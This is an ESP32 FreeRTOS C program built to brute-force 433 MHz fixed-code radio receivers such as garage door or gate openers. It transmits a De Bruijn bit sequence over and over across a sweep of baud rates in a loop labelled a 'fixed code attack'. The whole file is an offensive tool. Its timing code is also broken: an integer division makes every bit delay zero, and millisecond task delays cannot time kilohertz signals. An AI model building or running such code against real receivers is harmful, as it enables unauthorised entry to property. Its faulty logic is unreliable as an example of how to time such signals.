#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include "driver/gpio.h"
#include "esp_log.h"
#include "esp_timer.h"

#include "de_bruijn.c"

#define RX_433 2 
#define TX_433 3

#define MIN_BAUDRATE_HZ     2000
#define MAX_BAUDRATE_HZ     40000
#define SKIP_BAUDRATE_HZ    500

#define TX_REPEAT 5

static const char *TAG = "main";

void tx_seq(char* seq, uint32_t len, double wait)
{
    for (uint32_t i = 0; i < len; ++i)
    {
        gpio_set_level(TX_433, seq[i] - '0');
        vTaskDelay(wait / portTICK_PERIOD_MS);
    }
}

void start_fixed_code_attack()
{
    ESP_LOGI(TAG, "Start fixed code attack");
    
    const char charset[2] = { '0', '1' };

    int64_t de_bruijn_seq_start = esp_timer_get_time();
    char* de_bruijn_seq = de_bruijn(charset, 4, 123);
    int64_t de_bruijn_seq_end = esp_timer_get_time();

    int64_t de_bruijn_seq_bin_start = esp_timer_get_time();
    char* de_bruijn_seq_bin = de_bruijn_binary(4);
    int64_t de_bruijn_seq_bin_end = esp_timer_get_time();

    uint32_t de_bruijn_seq_len = strlen(de_bruijn_seq);
    uint32_t de_bruijn_seq_bin_len = strlen(de_bruijn_seq_bin);

    printf("len: %"PRIu32", seq: %s TIME: %0.5lf ms\n", de_bruijn_seq_len, de_bruijn_seq, (de_bruijn_seq_end - de_bruijn_seq_start) / 1e3);
    printf("len: %"PRIu32", seq: %s TIME: %0.5lf ms\n", de_bruijn_seq_bin_len, de_bruijn_seq_bin, (de_bruijn_seq_bin_end - de_bruijn_seq_bin_start) / 1e3);

    while (1)
    {
        const int64_t start_time = esp_timer_get_time();

        for (uint32_t baudrate = MIN_BAUDRATE_HZ; baudrate <= MAX_BAUDRATE_HZ; baudrate += SKIP_BAUDRATE_HZ)
        {
            const double wait = (1 / baudrate) * 1e3;
            for(int i = 0; i < TX_REPEAT; ++i)
            {
                tx_seq(de_bruijn_seq, de_bruijn_seq_len, wait);
            }
            vTaskDelay(5 / portTICK_PERIOD_MS);
        }

        const int64_t end_time = esp_timer_get_time();

        printf("Try de_brujin: %"PRId64" us | %0.5lf ms \n", end_time - start_time, (end_time - start_time) / 1e3);

        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }

    free(de_bruijn_seq);
    free(de_bruijn_seq_bin);

    vTaskSuspend(NULL);

}


void app_main(void)
{
    gpio_reset_pin(RX_433);
    gpio_set_direction(RX_433, GPIO_MODE_INPUT);

    gpio_reset_pin(TX_433);
    gpio_set_direction(TX_433, GPIO_MODE_OUTPUT);


    xTaskCreate(start_fixed_code_attack, "Start fixed code attack", 8192, NULL, 1, NULL);

}
